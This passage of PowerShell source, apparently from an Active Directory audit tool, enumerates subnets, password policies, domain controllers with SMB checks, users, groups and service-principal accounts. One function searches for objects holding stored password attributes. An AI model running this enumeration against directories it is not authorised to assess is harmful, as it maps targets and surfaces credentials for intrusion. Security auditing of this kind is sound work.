        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $SearchPath = "CN=Subnets,CN=Sites"
            $ADSubnets = Get-ADObject -SearchBase "$SearchPath,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter "(objectClass=subnet)" -Properties Name,Description,siteObject,whenCreated,whenChanged
        }
        Catch
        {
            Write-Warning "[Get-ADRSubnet] Error while enumerating Subnet Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADSubnets)
        {
            Write-Verbose "[*] Total Subnets: $([ADRecon.ADWSClass]::ObjectCount($ADSubnets))"

            $ADSubnetObj = @()
            $ADSubnets | ForEach-Object {

                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Site" -Value $(($_.siteObject -Split ",")[0] -replace 'CN=','')
                $Obj | Add-Member -MemberType NoteProperty -Name "Name" -Value $_.Name
                $Obj | Add-Member -MemberType NoteProperty -Name "Description" -Value $_.Description
                $Obj | Add-Member -MemberType NoteProperty -Name "whenCreated" -Value $_.whenCreated
                $Obj | Add-Member -MemberType NoteProperty -Name "whenChanged" -Value $_.whenChanged
                $ADSubnetObj += $Obj
            }
            Remove-Variable ADSubnets
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $SearchPath = "CN=Subnets,CN=Sites"
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)", $Credential.UserName,$Credential.GetNetworkCredential().Password
        }
        Else
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)"
        }
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $ObjSearcher.Filter = "(objectClass=subnet)"
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADSubnets = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRSubnet] Error while enumerating Subnet Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADSubnets)
        {
            Write-Verbose "[*] Total Subnets: $([ADRecon.LDAPClass]::ObjectCount($ADSubnets))"

            $ADSubnetObj = @()
            $ADSubnets | ForEach-Object {

                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Site" -Value $((([string] $_.Properties.siteobject) -Split ",")[0] -replace 'CN=','')
                $Obj | Add-Member -MemberType NoteProperty -Name "Name" -Value $([string] $_.Properties.name)
                $Obj | Add-Member -MemberType NoteProperty -Name "Description" -Value $([string] $_.Properties.description)
                $Obj | Add-Member -MemberType NoteProperty -Name "whenCreated" -Value ([DateTime] $($_.Properties.whencreated))
                $Obj | Add-Member -MemberType NoteProperty -Name "whenChanged" -Value ([DateTime] $($_.Properties.whenchanged))
                $ADSubnetObj += $Obj
            }
            Remove-Variable ADSubnets
        }
    }

    If ($ADSubnetObj)
    {
        Return $ADSubnetObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRDefaultPasswordPolicy
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADpasspolicy = Get-ADDefaultDomainPasswordPolicy
        }
        Catch
        {
            Write-Warning "[Get-ADRDefaultPasswordPolicy] Error while enumerating the Default Password Policy"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADpasspolicy)
        {
            $ObjValues = @( "Enforce password history (passwords)", $ADpasspolicy.PasswordHistoryCount, "4", "Req. 8.2.5", "8", "Control: 0423", "24 or more",
            "Maximum password age (days)", $ADpasspolicy.MaxPasswordAge.days, "90", "Req. 8.2.4", "90", "Control: 0423", "1 to 60",
            "Minimum password age (days)", $ADpasspolicy.MinPasswordAge.days, "N/A", "-", "1", "Control: 0423", "1 or more",
            "Minimum password length (characters)", $ADpasspolicy.MinPasswordLength, "7", "Req. 8.2.3", "13", "Control: 0421", "14 or more",
            "Password must meet complexity requirements", $ADpasspolicy.ComplexityEnabled, $true, "Req. 8.2.3", $true, "Control: 0421", $true,
            "Store password using reversible encryption for all users in the domain", $ADpasspolicy.ReversibleEncryptionEnabled, "N/A", "-", "N/A", "-", $false,
            "Account lockout duration (mins)", $ADpasspolicy.LockoutDuration.minutes, "0 (manual unlock) or 30", "Req. 8.1.7", "N/A", "-", "15 or more",
            "Account lockout threshold (attempts)", $ADpasspolicy.LockoutThreshold, "1 to 6", "Req. 8.1.6", "1 to 5", "Control: 1403", "1 to 10",
            "Reset account lockout counter after (mins)", $ADpasspolicy.LockoutObservationWindow.minutes, "N/A", "-", "N/A", "-", "15 or more" )

            Remove-Variable ADpasspolicy
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        If ($ObjDomain)
        {

            $pwdProperties = @{
                "DOMAIN_PASSWORD_COMPLEX" = 1;
                "DOMAIN_PASSWORD_NO_ANON_CHANGE" = 2;
                "DOMAIN_PASSWORD_NO_CLEAR_CHANGE" = 4;
                "DOMAIN_LOCKOUT_ADMINS" = 8;
                "DOMAIN_PASSWORD_STORE_CLEARTEXT" = 16;
                "DOMAIN_REFUSE_PASSWORD_CHANGE" = 32
            }

            If (($ObjDomain.pwdproperties.value -band $pwdProperties["DOMAIN_PASSWORD_COMPLEX"]) -eq $pwdProperties["DOMAIN_PASSWORD_COMPLEX"])
            {
                $ComplexPasswords = $true
            }
            Else
            {
                $ComplexPasswords = $false
            }

            If (($ObjDomain.pwdproperties.value -band $pwdProperties["DOMAIN_PASSWORD_STORE_CLEARTEXT"]) -eq $pwdProperties["DOMAIN_PASSWORD_STORE_CLEARTEXT"])
            {
                $ReversibleEncryption = $true
            }
            Else
            {
                $ReversibleEncryption = $false
            }

            $LockoutDuration = $($ObjDomain.ConvertLargeIntegerToInt64($ObjDomain.lockoutduration.value)/-600000000)

            If ($LockoutDuration -gt 99999)
            {
                $LockoutDuration = 0
            }

            $ObjValues = @( "Enforce password history (passwords)", $ObjDomain.PwdHistoryLength.value, "4", "Req. 8.2.5", "8", "Control: 0423", "24 or more",
            "Maximum password age (days)", $($ObjDomain.ConvertLargeIntegerToInt64($ObjDomain.maxpwdage.value) /-864000000000), "90", "Req. 8.2.4", "90", "Control: 0423", "1 to 60",
            "Minimum password age (days)", $($ObjDomain.ConvertLargeIntegerToInt64($ObjDomain.minpwdage.value) /-864000000000), "N/A", "-", "1", "Control: 0423", "1 or more",
            "Minimum password length (characters)", $ObjDomain.MinPwdLength.value, "7", "Req. 8.2.3", "13", "Control: 0421", "14 or more",
            "Password must meet complexity requirements", $ComplexPasswords, $true, "Req. 8.2.3", $true, "Control: 0421", $true,
            "Store password using reversible encryption for all users in the domain", $ReversibleEncryption, "N/A", "-", "N/A", "-", $false,
            "Account lockout duration (mins)", $LockoutDuration, "0 (manual unlock) or 30", "Req. 8.1.7", "N/A", "-", "15 or more",
            "Account lockout threshold (attempts)", $ObjDomain.LockoutThreshold.value, "1 to 6", "Req. 8.1.6", "1 to 5", "Control: 1403", "1 to 10",
            "Reset account lockout counter after (mins)", $($ObjDomain.ConvertLargeIntegerToInt64($ObjDomain.lockoutobservationWindow.value)/-600000000), "N/A", "-", "N/A", "-", "15 or more" )

            Remove-Variable pwdProperties
            Remove-Variable ComplexPasswords
            Remove-Variable ReversibleEncryption
        }
    }

    If ($ObjValues)
    {
        $ADPassPolObj = @()
        For ($i = 0; $i -lt $($ObjValues.Count); $i++)
        {
            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name "Policy" -Value $ObjValues[$i]
            $Obj | Add-Member -MemberType NoteProperty -Name "Current Value" -Value $ObjValues[$i+1]
            $Obj | Add-Member -MemberType NoteProperty -Name "PCI DSS Requirement" -Value $ObjValues[$i+2]
            $Obj | Add-Member -MemberType NoteProperty -Name "PCI DSS v3.2.1" -Value $ObjValues[$i+3]
            $Obj | Add-Member -MemberType NoteProperty -Name "ASD ISM" -Value $ObjValues[$i+4]
            $Obj | Add-Member -MemberType NoteProperty -Name "2018 ISM Controls" -Value $ObjValues[$i+5]
            $Obj | Add-Member -MemberType NoteProperty -Name "CIS Benchmark 2016" -Value $ObjValues[$i+6]
            $i += 6
            $ADPassPolObj += $Obj
        }
        Remove-Variable ObjValues
        Return $ADPassPolObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRFineGrainedPasswordPolicy
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADFinepasspolicy = Get-ADFineGrainedPasswordPolicy -Filter *
        }
        Catch
        {
            Write-Warning "[Get-ADRFineGrainedPasswordPolicy] Error while enumerating the Fine Grained Password Policy"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADFinepasspolicy)
        {
            $ADPassPolObj = @()

            $ADFinepasspolicy | ForEach-Object {
                For($i=0; $i -lt $($_.AppliesTo.Count); $i++)
                {
                    $AppliesTo = $AppliesTo + "," + $_.AppliesTo[$i]
                }
                If ($null -ne $AppliesTo)
                {
                    $AppliesTo = $AppliesTo.TrimStart(",")
                }
                $ObjValues = @("Name", $($_.Name), "Applies To", $AppliesTo, "Enforce password history", $_.PasswordHistoryCount, "Maximum password age (days)", $_.MaxPasswordAge.days, "Minimum password age (days)", $_.MinPasswordAge.days, "Minimum password length", $_.MinPasswordLength, "Password must meet complexity requirements", $_.ComplexityEnabled, "Store password using reversible encryption", $_.ReversibleEncryptionEnabled, "Account lockout duration (mins)", $_.LockoutDuration.minutes, "Account lockout threshold", $_.LockoutThreshold, "Reset account lockout counter after (mins)", $_.LockoutObservationWindow.minutes, "Precedence", $($_.Precedence))
                For ($i = 0; $i -lt $($ObjValues.Count); $i++)
                {
                    $Obj = New-Object PSObject
                    $Obj | Add-Member -MemberType NoteProperty -Name "Policy" -Value $ObjValues[$i]
                    $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ObjValues[$i+1]
                    $i++
                    $ADPassPolObj += $Obj
                }
            }
            Remove-Variable ADFinepasspolicy
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        If ($ObjDomain)
        {
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            $ObjSearcher.PageSize = $PageSize
            $ObjSearcher.Filter = "(objectClass=msDS-PasswordSettings)"
            $ObjSearcher.SearchScope = "Subtree"
            Try
            {
                $ADFinepasspolicy = $ObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning "[Get-ADRFineGrainedPasswordPolicy] Error while enumerating the Fine Grained Password Policy"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                Return $null
            }

            If ($ADFinepasspolicy)
            {
                If ([ADRecon.LDAPClass]::ObjectCount($ADFinepasspolicy) -ge 1)
                {
                    $ADPassPolObj = @()
                    $ADFinepasspolicy | ForEach-Object {
                    For($i=0; $i -lt $($_.Properties.'msds-psoappliesto'.Count); $i++)
                    {
                        $AppliesTo = $AppliesTo + "," + $_.Properties.'msds-psoappliesto'[$i]
                    }
                    If ($null -ne $AppliesTo)
                    {
                        $AppliesTo = $AppliesTo.TrimStart(",")
                    }
                        $ObjValues = @("Name", $($_.Properties.name), "Applies To", $AppliesTo, "Enforce password history", $($_.Properties.'msds-passwordhistorylength'), "Maximum password age (days)", $($($_.Properties.'msds-maximumpasswordage') /-864000000000), "Minimum password age (days)", $($($_.Properties.'msds-minimumpasswordage') /-864000000000), "Minimum password length", $($_.Properties.'msds-minimumpasswordlength'), "Password must meet complexity requirements", $($_.Properties.'msds-passwordcomplexityenabled'), "Store password using reversible encryption", $($_.Properties.'msds-passwordreversibleencryptionenabled'), "Account lockout duration (mins)", $($($_.Properties.'msds-lockoutduration')/-600000000), "Account lockout threshold", $($_.Properties.'msds-lockoutthreshold'), "Reset account lockout counter after (mins)", $($($_.Properties.'msds-lockoutobservationwindow')/-600000000), "Precedence", $($_.Properties.'msds-passwordsettingsprecedence'))
                        For ($i = 0; $i -lt $($ObjValues.Count); $i++)
                        {
                            $Obj = New-Object PSObject
                            $Obj | Add-Member -MemberType NoteProperty -Name "Policy" -Value $ObjValues[$i]
                            $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ObjValues[$i+1]
                            $i++
                            $ADPassPolObj += $Obj
                        }
                    }
                }
                Remove-Variable ADFinepasspolicy
            }
        }
    }

    If ($ADPassPolObj)
    {
        Return $ADPassPolObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRDomainController
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADDomainControllers = Get-ADDomainController -Filter *
        }
        Catch
        {
            Write-Warning "[Get-ADRDomainController] Error while enumerating DomainController Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }


        If ($ADDomainControllers)
        {
            Write-Verbose "[*] Total Domain Controllers: $([ADRecon.ADWSClass]::ObjectCount($ADDomainControllers))"

            $DCObj = @()
            $ADDomainControllers | ForEach-Object {

                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Domain" -Value $_.Domain
                $Obj | Add-Member -MemberType NoteProperty -Name "Site" -Value $_.Site
                $Obj | Add-Member -MemberType NoteProperty -Name "Name" -Value $_.Name
                $Obj | Add-Member -MemberType NoteProperty -Name "IPv4Address" -Value $_.IPv4Address
                $OSVersion = [ADRecon.ADWSClass]::CleanString($($_.OperatingSystem + " " + $_.OperatingSystemHotfix + " " + $_.OperatingSystemServicePack + " " + $_.OperatingSystemVersion))
                $Obj | Add-Member -MemberType NoteProperty -Name "Operating System" -Value $OSVersion
                Remove-Variable OSVersion
                $Obj | Add-Member -MemberType NoteProperty -Name "Hostname" -Value $_.HostName
                If ($_.OperationMasterRoles -like 'DomainNamingMaster')
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Naming" -Value $true
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Naming" -Value $false
                }
                If ($_.OperationMasterRoles -like 'SchemaMaster')
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Schema" -Value $true
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Schema" -Value $false
                }
                If ($_.OperationMasterRoles -like 'InfrastructureMaster')
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Infra" -Value $true
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Infra" -Value $false
                }
                If ($_.OperationMasterRoles -like 'RIDMaster')
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "RID" -Value $true
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "RID" -Value $false
                }
                If ($_.OperationMasterRoles -like 'PDCEmulator')
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "PDC" -Value $true
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "PDC" -Value $false
                }
                $DCSMBObj = [ADRecon.PingCastleScannersSMBScanner]::GetPSObject($_.IPv4Address)
                ForEach ($Property in $DCSMBObj.psobject.Properties)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name $Property.Name -Value $Property.value
                }
                $DCObj += $Obj
            }
            Remove-Variable ADDomainControllers
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain.distinguishedName)
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain",$($DomainFQDN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Try
            {
                $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            Catch
            {
                Write-Warning "[Get-ADRDomainController] Error getting Domain Context"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                Return $null
            }
            Remove-Variable DomainContext
        }
        Else
        {
            $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }

        If ($ADDomain.DomainControllers)
        {
            Write-Verbose "[*] Total Domain Controllers: $([ADRecon.LDAPClass]::ObjectCount($ADDomain.DomainControllers))"

            $DCObj = @()
            $ADDomain.DomainControllers | ForEach-Object {

                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Domain" -Value $_.Domain
                $Obj | Add-Member -MemberType NoteProperty -Name "Site" -Value $_.SiteName
                $Obj | Add-Member -MemberType NoteProperty -Name "Name" -Value ($_.Name -Split ("\."))[0]
                $Obj | Add-Member -MemberType NoteProperty -Name "IPAddress" -Value $_.IPAddress
                $Obj | Add-Member -MemberType NoteProperty -Name "Operating System" -Value $_.OSVersion
                $Obj | Add-Member -MemberType NoteProperty -Name "Hostname" -Value $_.Name
                If ($null -ne $_.Roles)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Naming" -Value $($_.Roles.Contains("NamingRole"))
                    $Obj | Add-Member -MemberType NoteProperty -Name "Schema" -Value $($_.Roles.Contains("SchemaRole"))
                    $Obj | Add-Member -MemberType NoteProperty -Name "Infra" -Value $($_.Roles.Contains("InfrastructureRole"))
                    $Obj | Add-Member -MemberType NoteProperty -Name "RID" -Value $($_.Roles.Contains("RidRole"))
                    $Obj | Add-Member -MemberType NoteProperty -Name "PDC" -Value $($_.Roles.Contains("PdcRole"))
                }
                Else
                {

                    "Naming", "Schema", "Infra", "RID", "PDC" | ForEach-Object {
                        $Obj | Add-Member -MemberType NoteProperty -Name $_ -Value $false
                    }
                }
                $DCSMBObj = [ADRecon.PingCastleScannersSMBScanner]::GetPSObject($_.IPAddress)
                ForEach ($Property in $DCSMBObj.psobject.Properties)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name $Property.Name -Value $Property.value
                }
                $DCObj += $Obj
            }
            Remove-Variable ADDomain
        }
    }

    If ($DCObj)
    {
        Return $DCObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRUser
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $true)]
        [DateTime] $date,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $DormantTimeSpan = 90,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADUsers = @( Get-ADUser -Filter * -ResultPageSize $PageSize -Properties AccountExpirationDate,accountExpires,AccountNotDelegated,AdminCount,AllowReversiblePasswordEncryption,c,CannotChangePassword,CanonicalName,Company,Department,Description,DistinguishedName,DoesNotRequirePreAuth,Enabled,givenName,homeDirectory,Info,LastLogonDate,lastLogonTimestamp,LockedOut,LogonWorkstations,mail,Manager,middleName,mobile,'msDS-AllowedToDelegateTo','msDS-SupportedEncryptionTypes',Name,PasswordExpired,PasswordLastSet,PasswordNeverExpires,PasswordNotRequired,primaryGroupID,profilePath,pwdlastset,SamAccountName,ScriptPath,SID,SIDHistory,SmartcardLogonRequired,sn,Title,TrustedForDelegation,TrustedToAuthForDelegation,UseDESKeyOnly,UserAccountControl,whenChanged,whenCreated )
        }
        Catch
        {
            Write-Warning "[Get-ADRUser] Error while enumerating User Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADUsers)
        {
            Try
            {
                $ADpasspolicy = Get-ADDefaultDomainPasswordPolicy
                $PassMaxAge = $ADpasspolicy.MaxPasswordAge.days
                Remove-Variable ADpasspolicy
            }
            Catch
            {
                Write-Warning "[Get-ADRUser] Error retrieving Max Password Age from the Default Password Policy. Using value as 90 days"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                $PassMaxAge = 90
            }

            Write-Verbose "[*] Total Users: $([ADRecon.ADWSClass]::ObjectCount($ADUsers))"
            $UserObj = [ADRecon.ADWSClass]::UserParser($ADUsers, $date, $DormantTimeSpan, $PassMaxAge, $Threads)
            Remove-Variable ADUsers
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(samAccountType=805306368)"

        $ObjSearcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]'Dacl'
        $ObjSearcher.PropertiesToLoad.AddRange(("accountExpires","admincount","c","canonicalname","company","department","description","distinguishedname","givenName","homedirectory","info","lastLogontimestamp","mail","manager","middleName","mobile","msDS-AllowedToDelegateTo","msDS-SupportedEncryptionTypes","name","ntsecuritydescriptor","objectsid","primarygroupid","profilepath","pwdLastSet","samaccountName","scriptpath","sidhistory","sn","title","useraccountcontrol","userworkstations","whenchanged","whencreated"))
        $ObjSearcher.SearchScope = "Subtree"
        Try
        {
            $ADUsers = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRUser] Error while enumerating User Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADUsers)
        {
            $PassMaxAge = $($ObjDomain.ConvertLargeIntegerToInt64($ObjDomain.maxpwdage.value) /-864000000000)
            If (-Not $PassMaxAge)
            {
                Write-Warning "[Get-ADRUser] Error retrieving Max Password Age from the Default Password Policy. Using value as 90 days"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                $PassMaxAge = 90
            }

            Write-Verbose "[*] Total Users: $([ADRecon.LDAPClass]::ObjectCount($ADUsers))"
            $UserObj = [ADRecon.LDAPClass]::UserParser($ADUsers, $date, $DormantTimeSpan, $PassMaxAge, $Threads)
            Remove-Variable ADUsers
        }
    }

    If ($UserObj)
    {
        Return $UserObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRUserSPN
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADUsers = @( Get-ADObject -LDAPFilter "(&(samAccountType=805306368)(servicePrincipalName=*))" -Properties Name,Description,memberOf,sAMAccountName,servicePrincipalName,primaryGroupID,pwdLastSet,userAccountControl -ResultPageSize $PageSize )
        }
        Catch
        {
            Write-Warning "[Get-ADRUserSPN] Error while enumerating UserSPN Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADUsers)
        {
            Write-Verbose "[*] Total UserSPNs: $([ADRecon.ADWSClass]::ObjectCount($ADUsers))"
            $UserSPNObj = [ADRecon.ADWSClass]::UserSPNParser($ADUsers, $Threads)
            Remove-Variable ADUsers
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(&(samAccountType=805306368)(servicePrincipalName=*))"
        $ObjSearcher.PropertiesToLoad.AddRange(("name","description","memberof","samaccountname","serviceprincipalname","primarygroupid","pwdlastset","useraccountcontrol"))
        $ObjSearcher.SearchScope = "Subtree"
        Try
        {
            $ADUsers = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRUserSPN] Error while enumerating UserSPN Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADUsers)
        {
            Write-Verbose "[*] Total UserSPNs: $([ADRecon.LDAPClass]::ObjectCount($ADUsers))"
            $UserSPNObj = [ADRecon.LDAPClass]::UserSPNParser($ADUsers, $Threads)
            Remove-Variable ADUsers
        }
    }

    If ($UserSPNObj)
    {
        Return $UserSPNObj
    }
    Else
    {
        Return $null
    }

}


Function Get-ADRPasswordAttributes
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADUsers = Get-ADObject -LDAPFilter '(|(UserPassword=*)(UnixUserPassword=*)(unicodePwd=*)(msSFU30Password=*))' -ResultPageSize $PageSize -Properties *
        }
        Catch
        {
            Write-Warning "[Get-ADRPasswordAttributes] Error while enumerating Password Attributes"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADUsers)
        {
            Write-Warning "[*] Total PasswordAttribute Objects: $([ADRecon.ADWSClass]::ObjectCount($ADUsers))"
            $UserObj = $ADUsers
            Remove-Variable ADUsers
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(|(UserPassword=*)(UnixUserPassword=*)(unicodePwd=*)(msSFU30Password=*))"
        $ObjSearcher.SearchScope = "Subtree"
        Try
        {
            $ADUsers = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRPasswordAttributes] Error while enumerating Password Attributes"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADUsers)
        {
            $cnt = [ADRecon.LDAPClass]::ObjectCount($ADUsers)
            If ($cnt -gt 0)
            {
                Write-Warning "[*] Total PasswordAttribute Objects: $cnt"
            }
            $UserObj = $ADUsers
            Remove-Variable ADUsers
        }
    }

    If ($UserObj)
    {
        Return $UserObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRGroup
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADGroups = @( Get-ADGroup -Filter * -ResultPageSize $PageSize -Properties AdminCount,CanonicalName,DistinguishedName,Description,GroupCategory,GroupScope,SamAccountName,SID,SIDHistory,managedBy,whenChanged,whenCreated )
        }
        Catch
        {
            Write-Warning "[Get-ADRGroup] Error while enumerating Group Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADGroups)
        {
            Write-Verbose "[*] Total Groups: $([ADRecon.ADWSClass]::ObjectCount($ADGroups))"
            $GroupObj = [ADRecon.ADWSClass]::GroupParser($ADGroups, $Threads)
            Remove-Variable ADGroups
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(objectClass=group)"
        $ObjSearcher.PropertiesToLoad.AddRange(("admincount","canonicalname", "distinguishedname", "description", "grouptype","samaccountname", "sidhistory", "managedby", "objectsid", "whencreated", "whenchanged"))
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADGroups = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRGroup] Error while enumerating Group Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADGroups)
        {
            Write-Verbose "[*] Total Groups: $([ADRecon.LDAPClass]::ObjectCount($ADGroups))"
            $GroupObj = [ADRecon.LDAPClass]::GroupParser($ADGroups, $Threads)
            Remove-Variable ADGroups
        }
    }

    If ($GroupObj)
    {
        Return $GroupObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRGroupMember
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADDomain = Get-ADDomain
            $ADDomainSID = $ADDomain.DomainSID.Value
            Remove-Variable ADDomain
        }
        Catch
        {
            Write-Warning "[Get-ADRGroupMember] Error getting Domain Context"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        Try
        {
            $ADGroups = $ADGroups = @( Get-ADGroup -Filter * -ResultPageSize $PageSize -Properties SamAccountName,SID )
        }
        Catch
        {
            Write-Warning "[Get-ADRGroupMember] Error while enumerating Group Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }

        Try
        {
            $ADGroupMembers = @( Get-ADObject -LDAPFilter '(|(memberof=*)(primarygroupid=*))' -Properties DistinguishedName,memberof,primaryGroupID,sAMAccountName,samaccounttype )
        }
        Catch
        {
            Write-Warning "[Get-ADRGroupMember] Error while enumerating GroupMember Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ( ($ADDomainSID) -and ($ADGroups) -and ($ADGroupMembers) )
        {
